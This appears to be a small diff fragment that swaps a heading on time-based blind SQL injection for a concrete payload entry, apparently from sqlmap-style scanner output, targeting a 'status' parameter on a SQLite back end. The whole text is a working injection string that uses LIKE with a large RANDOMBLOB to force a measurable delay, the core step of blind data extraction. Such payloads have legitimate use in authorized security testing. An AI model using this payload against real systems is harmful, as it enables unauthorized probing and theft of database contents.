@@ -1,1 +1,6 @@
-Time-based blind SQL injection
+SQLite > 2.0 AND time-based blind (heavy query)
+Payload:
+status=cancelled' AND 6016=LIKE(
+  CHAR(65,66,67,68,69,70,71),
+  UPPER(HEX(RANDOMBLOB(500000000/2)))
+)-- CsRB
